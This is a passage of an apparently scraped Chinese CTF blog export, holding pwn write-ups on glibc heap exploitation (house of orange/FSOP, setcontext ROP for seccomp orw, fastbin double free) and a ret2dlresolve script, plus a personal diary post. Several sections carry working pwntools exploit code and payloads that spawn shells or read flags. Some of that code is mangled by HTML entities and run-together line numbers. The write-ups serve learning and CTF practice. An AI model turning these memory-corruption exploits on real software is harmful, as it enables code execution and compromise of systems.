有一个比较奇怪的点，就是这道题我没有猜错的话最早的libc版本应该是libc-2.23.so，但是攻防世界提供的版本是2.19，虽然从io_file利用的角度来看两者其实区别挺大的吗，但是由于这个题目本身的限制非常之多，以至于两个版本实则没有什么大致的区别，并且因为攻防世界的libc没有调试符号，所以我索性就用2.23来做了。 ​ 在之前的步骤里我们获得了一个unsortedbin，这也是为什么说这道题的限制非常多，因为我们可以利用的也就只有这一个bin了，所以一般的堆利用方法几乎都失效了。 ​ 但是好巧不巧，我们就是能通过这一个bin来实现对于io_list_all的劫持。 ​ 但是在考虑这道题情况下的fsop前，我们需要先复习一下普通情况下的fsop，搞清楚几个链表节点以及结构体之间的关系。 ​ 实际上我们只需要劫持io_list_all，并把它指向我们伪造的结构体。fake struct需要绕过一些比较简单的检测，然后在结构体内部的字段伪造vtable，并将vtable指向的地方修改为我们想要的函数地址。 劫持io_list_all​ 首先我们需要劫持io_list_all，使它指向我们可以控制的内存区域。 ​ 这里会用到unsorted bin attack。将unsorted bin chunk的bk指向_IO_list_all - 0x10，那么就能通过 bck-&gt;fd = unsorted_chunks (av);使io_list_all指向&amp;main_arena+88 。_IO_list_all是位于libc中的全局变量，所以它的地址可以直接通过leak得到。 ​ 然后需要伪造结构体，这里面的逻辑比较抽象，大部分原因是我对于这种large bin或者smallbin以及一些结构，还有堆上chunk分配流程的不熟悉，但是我也只能象征性地去理解了。 ​ 最后看一眼伪造前的heap 伪造结构体​ 对于unsorted bin的bk指针，我们直接覆盖为_IO_list_all_addr - 0x10。 ​ 按照前面的分析，当我们将unsorted bin取出的时候，就会触发bck-&gt;fd =unsortedbin(av)操作。所以还是回到之前非常抽象的利用方式上，unsorted bin的取出环节实际是通过调用_IO_flush_all_lockp实现的，我们退出程序时，程序会自动调用这个函数，此时我们的_IO_list_all_addr 就被指向&amp;main_arena + 88，也就是此时已经成功地将io_list_all劫持，我们只需要在&amp;main_arena + 88指向的地址中构造fake struct就行。 ​ 虽然但是，程序并没有给我们机会让我们在&amp;main_arena + 88所指向的地方伪造chunk。 ​ ​ 所以我们选择利用下一个节点，这个节点在结构体中的偏移为0x68，也就是&amp;main_arena + 88 + 0x68，正好也是smallbin[6]的位置，所以我们希望能够伪造这个small chunk作为fake struct。 ​ 当unsortedbin size为0x60，当unsortedbin被取出，正好就会被放到这个0x60（？？？？？？？？）大小的small chunk中，我们所覆盖的fake struct也就生效了。 ​ 我只想问一个问题，为什么会有0x60的small chunk？ ​ 先用垃圾数据把原本的chunk填充。然后为了伪造fake chunk，首先要把上一个chunk的price结构体还原。 ​ 然后溢出unsortedbin，这里被溢出的chunk就是之前利用house of orange从top chunk获得的unsortedbin chunk。将chunk的size改为0x61。 ​ 接着填充bk，劫持指针。然后就是具体的fake struct的内容，首先需要绕过检测，具体可以看FSOP原理。 ​ 然后在fake struct填上vtable的地址，这里是heap+0x510。这个偏移的计算就是此时vtable相对于heap base的偏移加上0x20。也就是这个填入system的地址就是vtable addr指向的地方。 ​ 我佛慈悲。 1234567891011payload = b&#x27;a&#x27; * 0x400 + p64(0) + p64(0x21) + p64(0x1f00000000) + p64(0)payload = b&#x27;/bin/sh\\x00&#x27; + p64(0x61)payload += p64(0) + p64(_IO_list_all_addr - 0x10)#modify bk to _IO_list_all_addr - 0x10 payload += p64(0) + p64(1) #_IO_write_base &lt; _IO_write_ptrpayload = payload.ljust(0xc0,b&#x27;\\x00&#x27;) payload += p32(0) #_mode&lt;=0payload += p32(0) + p64(0) * 2payload += p64(vtable_addr)#a pointerpayload += p64(0) * 3 payload += p64(system_addr)#vtable + offsetedit(len(payload),payload)","categories":[{"name":"HEAP - House Of Orange","slug":"HEAP-House-Of-Orange","permalink":"https://fuurinko.github.io/categories/HEAP-House-Of-Orange/"}],"tags":[{"name":"xctf","slug":"xctf","permalink":"https://fuurinko.github.io/tags/xctf/"}]},{"title":"house_of_orange trick学习","slug":"heap_learning_house_of_orange","date":"2022-04-10T08:08:15.730Z","updated":"2022-04-10T08:53:03.620Z","comments":true,"path":"2022/04/10/heap_learning_house_of_orange/","link":"","permalink":"https://fuurinko.github.io/2022/04/10/heap_learning_house_of_orange/","excerpt":"","text":"​ 多年以后，秃头还记得第一次听梅丽桑德与佩利亚斯的那个下午，德彪西的抽象艺术直接把我整麻了。虽然德彪西真的很好听，但是做题的时候如果一直听德彪西，不协和音程与大量全音阶的使用会让整个人都会变得抽象魔幻起来，最后越做越emo。 ​ 此刻因为听了一天抽象音乐而变得呆滞的秃头正打算学习一些轻松愉快的知识来缓解沉闷的气氛，就比如这个久仰大名但是一直没有接触的house of orange。 ​ overview​ house of orange，大致就是指在程序没有free功能的情况下，通过攻击top chunk而获得一个free 的unsorted bin。 利用原理​ 当bin中没有任何bin满足我们申请的chunk size，top chunk size也小于我们申请的size时，系统会选择通过mmap()或brk()的方式申请更多的空间。 ​ 如果我们让堆以brk()的形式拓展，那么原有的top chunk就会被放入unsorted bin链表中，我们的目的就达成了。 ​ 那么如何让堆以brk()的方式拓展空间呢？​ 首先mamp()分配的话时需要申请的chunk大小满足一定阈值的。这个阈值一般是128k，也就是说我们需要申请的chunk size的第一个需要满足的条件，是小于128k。 ​ 其次top chunk结束地址需要页对齐。 ​ size的prev_inuse需要为1。 ​ size需要大于0x10。 示例源码来源于ctf-wiki 12345678910111213141516#include &lt;stdlib.h&gt;#define fake_size 0x41int main(void)&#123; void *ptr; ptr=malloc(0x10); ptr=(void *)((long long)ptr+24); *((long long*)ptr)=fake_size; // overwrite top chunk size malloc(0x60); malloc(0x60);&#125; ​ 这个程序是无法执行的，因为这里size并没有进行页对齐。 页对齐​ 通俗来说就是伪造的top chunk size的结束地址是0x1000的整数倍。 ​ 比如说top chunk起始地址为0x602020，size为0x20fe0，那么结束地址就是0x623000 ，这个数是0x1000的整数倍，就是十进制4096的整数倍，也就是4kb对齐。因此我们需要将top chunk size改得更小点已进行利用的时候，就可以选择类似1fe0，2fe0这样的size。 ​ ​ 所以当我们如此操作后，原本的top chunk就会被放入unsorted bin，当我们下次申请一些chunk的时候，就会从其中进行分割，我们就获得了unsorted chunk。 ​ 堆上的利用十分浅显易懂，但是一般来说这个点都会和io_file的fsop结合在一起，那样难度其实就上去了。","categories":[{"name":"HEAP - House Of Orange","slug":"HEAP-House-Of-Orange","permalink":"https://fuurinko.github.io/categories/HEAP-House-Of-Orange/"}],"tags":[{"name":"learning","slug":"learning","permalink":"https://fuurinko.github.io/tags/learning/"}]},{"title":"SilverWolf","slug":"ciscn_2021_silverwolf","date":"2022-04-10T00:54:01.043Z","updated":"2022-04-10T08:07:58.200Z","comments":true,"path":"2022/04/10/ciscn_2021_silverwolf/","link":"","permalink":"https://fuurinko.github.io/2022/04/10/ciscn_2021_silverwolf/","excerpt":"","text":"overview​ 这个题在程序上与lonewolf只有一个区别就是开了沙箱，需要orw，但是堆上的seccomp和栈上的利用难度可以说是毫无关系，因为之前已经做了lonelywolf，并且从来没有做过堆上的orw，漏洞点就不看了，只关注于orw的实现吧。 ​ init()过程中开启了seccomp，禁用了除orw以外的所有系统调用。 利用orw前的一些操作​ orw part之前的利用可以参考：https://fuurinko.github.io/2022/04/06/ciscn_2021_lonelywolf/ ​ leak heap及之前的操作都可以照搬。 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *libc = ELF(&quot;./libc-2.27.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process([&quot;./silverwolf&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;./libc-2.27.so&quot;&#125;)def add(idx,size): p.recvuntil(&quot;Your choice: &quot;) p.sendline(&#x27;1&#x27;) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;Size: &quot;) p.sendline(str(size))def edit(idx,data): p.recvuntil(&quot;Your choice: &quot;) p.sendline(str(2)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;Content: &quot;) p.sendline(data)def show(): p.recvuntil(&quot;Your choice: &quot;) p.sendline(str(3)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(0))def free(): p.recvuntil(&quot;Your choice: &quot;) p.sendline(str(4)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(0))add(0x60)add(0x78)free()show()p.recvuntil(&quot;Content: &quot;)heap_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))log.success(&quot;heap_addr =&gt; &#123;&#125;&quot;.format(hex(heap_addr)))#gdb.attach(p) 测试一下。 ​ 好乱啊呜呜。早就听说会影响堆风水，没有想到真的这么恐怖。 ​ 大致测试了一下，新申请的chunk确实还是在top chunk的上方，还算规律。所以leak heap的思路还是没有变化。 ​ 但是leak libc的话，之前是通过破坏tcache结构以申请unsorted bin，然后leak，。但是现在的话似乎不太好破坏tcache，本地调试尚且能看到偏移 ，但是如果是远程的话还是不太方便。 leak libc123456789101112131415161718192021add(0x20)free()edit(p64(heap_addr + 0xad0))#改fd为一个size大于0x80的chunk。add(0x20)add(0x20)#申请到fd指向的chunkfor i in range(5): edit(b&#x27;0&#x27;*0x10)#绕过tcahce double free 检测 free()show()p.recvuntil(&quot;Content: &quot;)data = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))malloc_hook = data - 0x70libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]log.success(&quot;libc_base =&gt; &#123;&#125;&quot;.format(hex(libc_base)))free_hook = libc_base + libc.symbols[&quot;__free_hook&quot;]log.success(&quot;free_hook =&gt; &#123;&#125;&quot;.format(hex(free_hook)))setcontext = libc_base + libc.symbols[&quot;setcontext&quot;]log.success(&quot;setcontext =&gt; &#123;&#125;&quot;.format(hex(setcontext))) rop chain to orw​ 为了实现orw，显然我们需要程序执行我们构造的，实现orw功能的rop链。rop链的构造比较简单，只需要利用ropper寻找到给出的libc.so中的需要的gadget就好了。 1234567pop_rdi_ret = 0x215bf + libc_basepop_rax_ret = 0x43ae8 + libc_basepop_rsi_ret = 0x23eea + libc_basepop_rdx_ret = 0x01b96 + libc_basepop_rsp_ret = 0x03960 + libc_basesyscall_ret = 0xd2745 + libc_baseflag_addr = heap_addr + 0x11b0 ​ 但是问题随之而来，我们应该如何执行这个rop链呢？显然我们不可能直接将rop链的地址直接填到什么地方去，因而要用到setcontext()这个函数。 ​ 在libc-2.27.so下setcontext()`的汇编代码如下： 123456789101112131415161718192021222324252627282930&lt;setcontext&gt;: push rdi&lt;setcontext+1&gt;: lea rsi,[rdi+0x128]&lt;setcontext+8&gt;: xor edx,edx&lt;setcontext+10&gt;: mov edi,0x2&lt;setcontext+15&gt;: mov r10d,0x8&lt;setcontext+21&gt;: mov eax,0xe&lt;setcontext+26&gt;: syscall &lt;setcontext+28&gt;: pop rdi&lt;setcontext+29&gt;: cmp rax,0xfffffffffffff001&lt;setcontext+35&gt;: jae 0x7ffff7a7d520 &lt;setcontext+128&gt;&lt;setcontext+37&gt;: mov rcx,QWORD PTR [rdi+0xe0]&lt;setcontext+44&gt;: fldenv [rcx]&lt;setcontext+46&gt;: ldmxcsr DWORD PTR [rdi+0x1c0]&lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0]&lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80]&lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78]&lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48]&lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50]&lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58]&lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60]&lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8]&lt;setcontext+94&gt;: push rcx&lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70]&lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88]&lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98]&lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28]&lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30]&lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68]&lt;setcontext+125&gt;: xor eax,eax&lt;setcontext+127&gt;: ret ​ ​ 可以看到从 &lt;setcontext+53&gt;开始，以rdi为索引对栈上的寄存器进行了一系列的赋值，所以我们只要能够控制rdi，就能够控制其中的寄存器。 ​ 一般的heap orw中需要利用到的主要是&lt;setcontext+53&gt;的rsp以及&lt;setcontext+87&gt;，&lt;setcontext+94&gt;的rcx。 ​ &lt;setcontext+94&gt;将rcx压栈，并且127还可以执行ret，于是我们传入的参数就被设置为rcx的值。 ​ 所以在实际利用中，可以将free_hook的值改为&lt;setcontext+53&gt;的地址，并且在堆块对应的a0以及a8偏移处填上rop链的地址以及ret的地址，以执行我们的rop。 ​ (ps:rop链不能太大，超出0x78范围就寄了，所以不能只选择系统调用，libc中的read和puts函数也可以使用，就能够省下两个gadget的空间) rop链如下： 123456789open_rop = p64(pop_rdi_ret) + p64(flag_addr)open_rop = p64(pop_rax_ret) + p64(2) + p64(syscall_ret)read_rop = p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(heap_addr)read_rop += p64(libc.sym[&quot;read&quot;] + libc_base) # readwrite_rop= p64(pop_rdi_ret) + p64(heap_addr)write_rop += p64(libc.sym[&quot;puts&quot;] + libc_base) # putsrop = open_rop + read_rop + write_rop 布置setcontext参数​ 首先把rop链写入chunk，对应的chunk地址就是rop链的地址。 ​ 接着读入flag。 ​ 由于setcontext中，mov rsp与mov rcx在地址上是连续的，所以直接编辑heap_addr + 0xa0的位置为rop地址以及ret地址。 ​ 修改free_hook为setcontext​ 比较常规。 12345678add(0x20)free()edit(p64(free_hook) + &#x27;\\n&#x27;)add(0x20)add(0x20)edit(p64(setcontext + 53) + &#x27;\\n&#x27;)add(0x78)free() ​ 说实话这个题的堆风水是我已经看不懂的程度了，所以大致逻辑我是明白的，具体的偏移真的算不懂了，下次来调一调，我人麻了，现在只想睡觉。","categories":[{"name":"HEAP - Seccomp","slug":"HEAP-Seccomp","permalink":"https://fuurinko.github.io/categories/HEAP-Seccomp/"}],"tags":[{"name":"ciscn","slug":"ciscn","permalink":"https://fuurinko.github.io/tags/ciscn/"}]},{"title":"daliy(不想做了)","slug":"ciscn_2019_daliy","date":"2022-04-09T08:20:21.957Z","updated":"2022-07-16T08:55:12.700Z","comments":true,"path":"2022/04/09/ciscn_2019_daliy/","link":"","permalink":"https://fuurinko.github.io/2022/04/09/ciscn_2019_daliy/","excerpt":"","text":"console.error(\"ReferenceError: value is not defined\"); Overview ​ 还可以。估计是个中等题。libc应该还是2.23。不得不说2019的ciscn初赛pwn确实是没有什么难度的。 Readd​ 第一次申请chunk时，操作如下： 123456789if ( !v0 ) &#123; head_0[4 * i] = size; *&amp;head_0[4 * i + 2] = malloc(size); puts(&quot;Now you can write you daily&quot;); read(0, *&amp;head_0[4 * i + 2], size); LODWORD(v0) = ++head; return v0; &#125; ​ ​ 所以head [4 * i + 2]会指向对应的chunk data。堆块结构相对来说比较简洁。从图中就可以很清晰地看到chunk 结构体的结构，只有一个size字段和chunk data ptr字段。 free12345678if ( *&amp;head_0[4 * idx + 2] ) &#123; free(*&amp;head_0[4 * idx + 2]); *&amp;head_0[4 * idx + 2] = 0LL; head_0[4 * idx] = 0; puts(&quot;remove successful!!&quot;); --::idx; &#125; ​ 如果对应idx的chunk data ptr存在，就free掉并置0，并且指针本身也置零,看上去没有明显的漏洞，但是问题在于free的检测只检查了ptr是否存在，并没有检查idx本身是否合法，所以这里可以填写一个不合法的idx以至于free任意chunk。 show123456789101112if ( idx ) &#123; for ( i = 0; i &lt;= 29; ++i ) &#123; if ( *&amp;head_0[4 * i + 2] ) printf(&quot;%d : %s&quot;, i, *&amp;head_0[4 * i + 2]); &#125; &#125; else &#123; puts(&quot;No item the box&quot;); &#125; ​ edit12345if ( *&amp;head_0[4 * idx + 2] &amp;&amp; idx &lt;= 0x1D ) &#123; puts(&quot;Please enter the new daily&quot;); read(0, *&amp;head_0[4 * idx + 2], head_0[4 * idx]); &#125; ​ 没有堆溢出。 利用思路​ free时没有检测idx的合法性，因此可以free 到实际的chunk ptr上，接着就可以leak libc了。所以我们需要计算我们需要free的位置对应的idx，所以需要先leak heap。 leak heap​ 首先申请两个fastbin，free掉，然后在add相同size的chunk到chunk0处，可以泄露堆地址。 123456789add(40,b&#x27;a&#x27;*40)add(40,b&#x27;a&#x27;*40)free(1)free(0)add(40,b&#x27;\\x11&#x27;)show()data = p.recv()[4:10]heap_addr = u64( data.ljust(8,b&#x27;\\x00&#x27;)) - 0x1log.success(&quot;heap_addr =&gt; &#123;&#125;&quot;.format(hex(heap_addr))) leak libc​ 拿到了heap base，就能够算出bss上chunk struct与heap base的相对偏移，然后free掉实际的chunk data。 123456789idx = (heap_addr - struct_addr) / 16edit(0,b&#x27;a&#x27;*8 + p64(heap_addr + 0x80 + 0x10))free(idx+1)show()data = p.recv()[4:10]malloc_hook = u64( data.ljust(8,b&#x27;\\x00&#x27;)) - 88 - 0x10log.success(&quot;malloc_hook =&gt; &#123;&#125;&quot;.format(hex(malloc_hook)))libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = libc_base + 0x4526A ​ 此时我们需要将chunk0的data的fd位编辑为某个unsorted bin chunk的地址，然后借用越界free将其free掉。这样我们就能在unsorted bin中获得一个虚空chunk。 double free​ 继续利用这个free，劫持fastbin fd，分配到malloc_hook上，改其为one_gadget。 ​ ​","categories":[{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"}],"tags":[{"name":"ciscn","slug":"ciscn","permalink":"https://fuurinko.github.io/tags/ciscn/"}]},{"title":"baby_pwn","slug":"ciscn_2019_baby_pwn","date":"2022-04-09T07:56:00.647Z","updated":"2022-04-09T08:12:17.584Z","comments":true,"path":"2022/04/09/ciscn_2019_baby_pwn/","link":"","permalink":"https://fuurinko.github.io/2022/04/09/ciscn_2019_baby_pwn/","excerpt":"","text":"console.error(\"ReferenceError: value is not defined\"); overview ​ 怪椰。 re123456ssize_t vuln()&#123; char buf[40]; // [esp+0h] [ebp-28h] BYREF return read(0, buf, 0x100u);&#125; ​ 蚌埠住了，ret2dl的板子题。蚌埠住了蚌埠住了蚌埠住了蚌埠住了蚌埠住了利用​ 翻出板子，已经成功了一半。 ​ 醒醒，你好像没有板子。 ​ 哦，那没事了。 ​ 难绷。 好。。。。 1234567891011121314151617181920212223242526272829from roputils import *from pwn import processfrom pwn import gdbfrom pwn import contextlibc = ELF(&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;r = process(&#x27;./baby_pwn&#x27;)r.recv()rop = ROP(&#x27;./baby_pwn&#x27;)offset = 44bss_base = rop.section(&#x27;.bss&#x27;)buf = rop.fill(offset)buf += rop.call(&#x27;read&#x27;, 0, bss_base, 100)## used to call dl_runtimeresolve()buf += rop.dl_resolve_call(bss_base + 20, bss_base)r.send(buf)buf = rop.string(&#x27;/bin/sh&#x27;)buf += rop.fill(20, buf)## used to make faking data, such relocation, Symbol, Strbuf += rop.dl_resolve_data(bss_base + 20, &#x27;system&#x27;)buf += rop.fill(100, buf)r.send(buf)r.interactive() 这个题。。。 虽然但是好像每年的ciscn都会有ret2dl。不管怎样我还是得熟练掌握一下（","categories":[{"name":"STACK - ret2dlreslove","slug":"STACK-ret2dlreslove","permalink":"https://fuurinko.github.io/categories/STACK-ret2dlreslove/"}],"tags":[{"name":"ciscn","slug":"ciscn","permalink":"https://fuurinko.github.io/tags/ciscn/"}]},{"title":"春夜","slug":"幻想曲-02-春夜","date":"2022-04-07T17:25:10.897Z","updated":"2022-04-13T03:29:27.533Z","comments":true,"path":"2022/04/08/幻想曲-02-春夜/","link":"","permalink":"https://fuurinko.github.io/2022/04/08/%E5%B9%BB%E6%83%B3%E6%9B%B2-02-%E6%98%A5%E5%A4%9C/","excerpt":"","text":"​ ​ 现在是2022年四月八日凌晨一点二十六分，其实按照这个月以来的作息，现在已经是熬夜的范畴了，但是我还是不能睡觉，因为万恶的glibc已经编译一个小时了。 ​ 其实也可以放着让它编译，但是我比较心疼我的电脑，这边编译占用了docker，我也不想再开一个窗口来做题了，于是抱着电脑在初春的夜里无所事事。 ​ 强调初春，是因为我今天去网上查铃兰的养殖注意事项，发现铃兰是春初发芽，春末开花。这一结果大大地振奋了我，我还以为我需要再等上几个月，但是现在它似乎再过十几天就能开花了。 ​ 铃兰居然不久以后就要开花了。 ​ 虽然是一件无关我生命的，看似毫无意义的事情，但是我的心情却因此而变得欢腾。从这样看来，这几株普通的植株，也因此与我的人生产生了微妙的联系。 ​ 这样，在我的人生意义清单表上，又多了一项——我想看到自己种的铃兰开花。 ​ 这么说似乎我是个需要依靠一个个自我强加的所谓意义苟活的玉玉症晚期患者，但是我现在已经把这件事想得比较明白了。哲学中的存在主义认为人生命的物质性是先于意义性的，所以意义原本并不存在，需要我们自身去寻找并赋予。我确实是比较认同这一点的。 ​ 卡夫卡在饥饿艺术家这样一篇只需要二十分钟便能将文字读完的短篇小说中，刻画了一位到死都在追求不被他人认可的意义，并且这种所谓的意义的来源实则十分荒谬的艺术家。在众人眼中饥饿艺术家为了莫名其妙的忍受饥饿的艺术而献身，是愚蠢而不自知的。但是拿哥说，人总是要死的，对于后人而言，只能留下名字，或者些许作品。全部的快乐痛苦，惊世骇俗的言论或思想，最后只是一剖黄土，所以只要放手做自己想做的事情就好了，没有必要纠结麦高芬，没有必要瞻前顾后。 ​ 我们并没有理由去怀疑饥饿艺术家表演的本心，我宁愿相信他所做即他所想，所以我认为这是一个伟大的艺术家，虽然他也只是一个因为找不到合胃口的食物而忍受饥饿的普通人。但是在某一瞬间，我确实与他产生了共鸣，我们同样是因为荒谬的理由才选择了这份意义，我们同样在追逐难以取得功名的事物，这份意义始终不被他人所理解，我们同样会因为挫败的心理而逐渐产生享受痛苦的快意。 ​ 我敬佩饥饿艺术家，但是我并不想成为他，我还是不想最终被饿死在铁笼子中，然后被无知的禽兽取代。 ​ 蚌埠住了，还没编译好。","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"幻想曲","slug":"幻想曲","permalink":"https://fuurinko.github.io/tags/%E5%B9%BB%E6%83%B3%E6%9B%B2/"}]},{"title":"RaceCondition.md","slug":"pwn.college_RaceCondition","date":"2022-04-07T17:11:22.484Z","updated":"2022-04-07T17:16:21.899Z","comments":true,"path":"2022/04/08/pwn.college_RaceCondition/","link":"","permalink":"https://fuurinko.github.io/2022/04/08/pwn.college_RaceCondition/","excerpt":"","text":"0​ 感觉pwncollege的堆题意思并不是很大，直接做条件竞争娱乐一下。 level1​ 笑死了，根本没学过，不会做。","categories":[{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"}],"tags":[{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"}]},{"title":"double","slug":"ciscn_2019_double","date":"2022-04-07T12:38:02.382Z","updated":"2022-04-09T07:55:20.924Z","comments":true,"path":"2022/04/07/ciscn_2019_double/","link":"","permalink":"https://fuurinko.github.io/2022/04/07/ciscn_2019_double/","excerpt":"","text":"console.error(\"ReferenceError: value is not defined\"); overview ​ 可以改表 re​ 这个题如果只看ida的话其实感觉挺乱的，所以以动调为主会比较好。在理清了程序运行的一些逻辑后再反过来看伪代码会清晰很多。 add1head_ptr = (unsigned int *)malloc(0x18uLL); ​ 如果先申请一个0x28大小的chunk。 ​ 那么首先创建一个结构体chunk，size为0x18。 ​ 这个结构体大致长这样： ​ 在010-014储存了size，014-018则为0 。 ​ 这个结构体字段猜测如下： 123size（高四位） 0（低四位）content ptr0 ​ ida中的伪代码对应为： 1234strncpy(chunk_ptr, s2, (int)(size + 1));struct_ptr[1] = size;*((_QWORD *)struct_ptr + 1) = chunk_ptr;*((_QWORD *)struct_ptr + 2) = 0LL; ​ 如果申请了同样内容的chunk，只会为新的chunk创建结构体，结构体内保存指向上一个相同chunk的content的ptr。 ​ 因此如果只要连续free两个内容相同的chunk就会造成double free。 ​ 创建相同内容时，chunk的结构体内存分布为下图： ​ 可以看到，布局与最开始创建的结构体类似。head+16储存的字段都指向对应的相同内容的chunk的content。 ​ 此外，还注意到程序在bss段上添加了两个全局变量。 ​ 当我们随便申请一些chunk，然后查看该变量的值，会发现它们指向的分别是处于最低地址的chunk的size/idx和处于最高位置的chunk的size/idx位。 ​ 对应end/start ptr的初始化操作的ida伪代码如下： 12345678910111213141516strncpy(chunk_ptr, s2, (int)(size + 1)); struct_ptr[1] = size; *((_QWORD *)struct_ptr + 1) = chunk_ptr; *((_QWORD *)struct_ptr + 2) = 0LL; if ( start_ptr )//第一次addchunk时，还没有start_ptr，于是将其赋值为结构体ptr &#123; *struct_ptr = *(_DWORD *)v3 + 1; *(_QWORD *)(v3 + 16) = struct_ptr; &#125; else &#123; *struct_ptr = 0; start_ptr = (__int64)struct_ptr; &#125; end_ptr = (__int64)struct_ptr;//首先在第一次add时，将end_ptr赋值为结构体ptr ​ 也就是当我们只申请了一个chunk时，start和end同时指向结构体chunk的ptr，也就是这个chunk的content域，也就是size/idx字段。 show1234567printf(&quot;Info index: &quot;);idx = read_num();for ( i = start_ptr; i; i = *(i + 16) )&#123; if ( idx == *i ) return puts(*(i + 8));&#125; ​ 看起来问题不大。 free​ 有uaf。 12free(*(ptr + 1));free(ptr); ​ 先后free了end ptr和start ptr，但是没有置0。 edit​ 有点类似show的逻辑。首先会比较输入的data的size与chunk本身的size，如果是小于等于的就memcopy过去，但是会多copy一个空字节，可能是作为截断。 ​ 如果size比原本chunk大的话，就另外add一个size+1大小的chunk，并将内容copy，然后将原本的chunk的content指针改为新的chunk content，size也一并更改。这个操作就很逆天，总感觉哪里不太对。 12345678910111213str_size = read_str(src, 256);if ( str_size &lt;= *(i + 4) )&#123; memcpy(*(i + 8), src, str_size + 1);&#125;else&#123; dest = malloc(str_size + 1); memcpy(dest, src, str_size + 1); *(i + 8) = dest; *(i + 4) = str_size;&#125;puts(&quot;Success&quot;); 利用整体思路​ 程序的关键就是如果两个chunk内容相同，可以操作第二个chunk来控制第一个chunk。比如我们可以借此来leak，edit chunk fd等。 leak unsorted bin​ 基于程序逻辑，我们add两个chunk，free掉chunk0，使其进入unsorted bin，虽然我们不能直接show(0)，但因为chunk1的content此时是指向chunk 0 content的，所以可以show 1来leak。 1234567add(b&#x27;1&#x27;*0x90)add(b&#x27;1&#x27;*0x90)free(0)show(1)data = p.recv(6)malloc_hook = u64( data.ljust(8,b&#x27;\\x00&#x27;)) - 88 - 0x10 劫持fastbin fd​ 首先利用三个chunk构造double free，制造修改fd的机会。 123456add(b&#x27;2&#x27;*0x67)#2add(b&#x27;2&#x27;*0x67)#3add(b&#x27;3&#x27;*0x67)#4free(2)free(4)free(3)#doble free chunk0 ​ 然后按照一定顺序free掉它们，使得chunk2被double free。 ​ ​ 1234add(b&#x27;1&#x27;*0x67)#6 struct chunk =&gt; 0x7ffff7fff090,contenr chunk =&gt; 0x7ffff7fff020edit(6,p64(malloc_hook-35))add(b&#x27;1&#x27;*0x67)#7add(b&#x27;3&#x27;*0x67)#8 修改fd，使其指向malloc_hook-35 ​ 这里减去三十五是为了构造fake chunk的size位，使其合法。详情可以看这里的分析：https://fuurinko.github.io/2022/04/02/fastbin中uaf实现任意地址分配的检测问题/ ​ 接着只需要多add几个chunk，并编辑对应chunk为one_gadget即可。 exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *libc = ELF(&quot;/glibc/2.23/64/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process([&quot;/glibc/2.23/64/lib/ld-2.23.so&quot;,&quot;./double&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/64/lib/libc-2.23.so&quot;&#125;)elf = ELF(&#x27;./double&#x27;)target_addr = 0x4040c0 + 0x8def add(data): p.sendlineafter(b&quot;&gt; &quot;,b&#x27;1&#x27;) p.sendlineafter(b&quot;Your data:&quot;,data)def edit(idx,data): p.sendlineafter(b&quot;&gt; &quot;,b&#x27;3&#x27;) p.sendlineafter(b&quot;Info index: &quot;,str(idx)) p.sendline(data)def free(idx): p.sendlineafter(b&quot;&gt; &quot;,b&#x27;4&#x27;) p.sendlineafter(b&quot;Info index: &quot;,str(idx))def show(idx): p.sendlineafter(b&quot;&gt; &quot;,b&#x27;2&#x27;) p.sendlineafter(b&quot;Info index: &quot;,str(idx))add(b&#x27;1&#x27;*0x90)#0add(b&#x27;1&#x27;*0x90)#1#add(b&#x27;1&#x27;*0x20)#5free(0)show(1)data = p.recv(6)malloc_hook = u64( data.ljust(8,b&#x27;\\x00&#x27;)) - 88 - 0x10log.success(&quot;malloc_hook =&gt; &#123;&#125;&quot;.format(hex(malloc_hook)))libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = libc_base + 0x4526Aadd(b&#x27;2&#x27;*0x67)#2add(b&#x27;2&#x27;*0x67)#3add(b&#x27;3&#x27;*0x67)#4free(2)free(4)free(3)#doble free chunk0add(b&#x27;1&#x27;*0x67)#6 struct chunk =&gt; 0x7ffff7fff090,contenr chunk =&gt; 